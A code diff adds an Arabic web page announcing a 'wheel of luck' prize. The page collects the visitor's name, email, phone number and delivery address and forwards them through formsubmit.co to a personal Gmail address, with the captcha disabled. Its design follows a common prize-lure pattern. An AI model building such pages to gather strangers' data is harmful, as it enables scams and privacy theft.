@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>استلام الجائزة 🎁</title>
+  <style>
+    :root {
+      --red: #d71920;
+      --dark: #b3121a;
+      --white: #ffffff;
+      --shadow: 0 8px 30px rgba(215,25,32,0.15);
+    }
+    * {
+      box-sizing: border-box;
+      font-family: "Segoe UI", "Noto Kufi Arabic", sans-serif;
+    }
+    body {
+      margin: 0;
+      background: linear-gradient(180deg, var(--white) 0%, #fff 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    .claim-box {
+      background: var(--white);
+      box-shadow: var(--shadow);
+      border-radius: 18px;
+      padding: 28px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
+    h1 {
+      color: var(--red);
+      font-size: 22px;
+      margin-bottom: 12px;
+    }
+    p {
+      color: #444;
+      margin-bottom: 20px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+    label {
+      text-align: right;
+      font-weight: 600;
+      color: #222;
+      font-size: 15px;
+    }
+    input, textarea {
+      padding: 12px;
+      border: 2px solid #eee;
+      border-radius: 10px;
+      font-size: 15px;
+      outline: none;
+      transition: 0.3s;
+    }
+    input:focus, textarea:focus {
+      border-color: var(--red);
+      box-shadow: 0 0 0 3px rgba(215,25,32,0.1);
+    }
+    button {
+      background: linear-gradient(90deg, var(--red), var(--dark));
+      color: white;
+      font-weight: 700;
+      border: 0;
+      border-radius: 10px;
+      padding: 14px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      transform: scale(1.02);
+    }
+    footer {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="claim-box">
+    <h1>🎉 مبروك! لقد ربحت جائزة</h1>
+    <p>يرجى ملء بياناتك التالية لإرسال الجائزة إليك.</p>
+
+    <form action="https://formsubmit.co/gope.can1111@gmail.com" method="POST">
+      <!-- إعدادات البريد -->
+      <input type="hidden" name="_subject" value="🎁 طلب استلام جائزة من عجلة الحظ">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label>الاسم الكامل:</label>
+      <input type="text" name="الاسم الكامل" required>
+
+      <label>البريد الإلكتروني:</label>
+      <input type="email" name="البريد الإلكتروني" required>
+
+      <label>رقم الهاتف:</label>
+      <input type="text" name="رقم الهاتف" required>
+
+      <label>عنوان الاستلام:</label>
+      <textarea name="عنوان الاستلام" rows="3" required></textarea>
+
+      <label>الجائزة:</label>
+      <input type="text" name="الجائزة" id="prizeField" readonly>
+
+      <button type="submit">📨 إرسال الطلب</button>
+    </form>
+
+    <footer>© 2025 عجلة الحظ</footer>
+  </div>
+
+  <script>
+    // جلب اسم الجائزة من رابط الصفحة (query parameter)
+    const params = new URLSearchParams(window.location.search);
+    const prize = params.get("prize");
+    if (prize) {
+      document.getElementById("prizeField").value = prize;
+    }
+    
+  </script>
+</body>
+</html>
